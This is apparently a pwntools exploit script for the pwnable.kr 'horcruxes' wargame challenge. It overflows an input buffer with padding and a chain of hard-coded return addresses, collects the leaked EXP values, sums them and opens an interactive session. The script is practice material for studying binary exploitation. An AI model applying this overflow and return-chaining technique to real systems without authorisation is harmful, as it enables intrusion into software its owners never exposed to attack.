from pwn import *

g_fname = "./horcruxes"
g_elf = ELF(g_fname)
context.binary = g_elf

context.log_level = "debug"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    g_io = remote("pwnable.kr", 9032)

pad_len = 0x74+4
call_ropme = 0x0809FFFC
ropme_addr = 0x80A0009
rop_addr = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]
tot = 0

payload = flat('A'*pad_len, rop_addr, call_ropme)
g_io.recvuntil(b"Select Menu:")
g_io.sendline(str(tot).encode())
g_io.recvuntil(b"earned? : ")
g_io.sendline(payload)
# g_io.recvline()

for i in range(7):
    g_io.recvuntil(b"EXP +")
    data = g_io.recvline()[:-2]
    log.info("data: %s" % data)
    tot += int(data)

g_io.recvuntil(b"Select Menu:")
g_io.sendline(str(tot).encode())    # Select Menu

g_io.recvuntil(b"earned? : ")
g_io.sendline(str(tot).encode())    # How many EXP did you earned? : 
g_io.interactive()

